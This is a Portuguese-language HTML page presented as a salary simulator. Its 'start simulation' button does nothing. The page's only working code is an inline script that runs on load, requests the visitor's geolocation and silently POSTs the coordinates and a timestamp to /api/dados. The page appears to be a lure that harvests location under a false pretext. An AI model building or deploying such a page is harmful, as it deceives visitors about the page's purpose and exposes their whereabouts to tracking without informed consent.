<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Simulação de Salário</title>
  <style>
    /* Reset básico */
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
    }
    body {
      font-family: Arial, sans-serif;
    }
    /* Seção de fundo em tela cheia */
    .hero {
      position: relative;
      width: 100%;
      min-height: 100vh;
      background: url("https://passagembaixacg.s3.us-east-2.amazonaws.com/piloto.png") no-repeat center center;
      background-size: cover;
    }
    /* Camada de overlay escura */
    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.6); /* overlay preto com transparência */
      display: flex;
      align-items: center;
      justify-content: center;
    }
    /* Conteúdo centralizado dentro do overlay */
    .container {
      text-align: center;
      color: #fff;
      max-width: 600px;
      padding: 20px;
    }
    .container h1 {
      font-size: 3em;
      margin: 0 0 20px;
    }
    .container p {
      font-size: 1.2em;
      margin: 0 0 30px;
    }
    .container button {
      background-color: #28a745;
      color: #fff;
      border: none;
      padding: 15px 30px;
      font-size: 1.1em;
      border-radius: 5px;
      cursor: pointer;
    }
    .container button:hover {
      background-color: #218838;
    }
    /* Ajustes responsivos para telas menores */
    @media (max-width: 600px) {
      .container h1 {
        font-size: 2em;
      }
      .container p {
        font-size: 1em;
      }
      .container button {
        padding: 12px 24px;
        font-size: 1em;
      }
    }
  </style>
</head>
<body>

  <div class="hero">
    <div class="overlay">
      <div class="container">
        <h1>Simulação de Salário</h1>
        <p>Calcule seu salário e descubra resultados personalizados</p>
        <button>Começar Simulação</button>
      </div>
    </div>
  </div>

  <script>
    // Captura de geolocalização (se disponível) e envio dos dados para /api/dados
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const data = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            timestamp: new Date().toISOString()
          };
          fetch('/api/dados', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
          });
        },
        (error) => {
          console.error('Erro ao obter localização:', error);
        }
      );
    }
  </script>

</body>
</html>
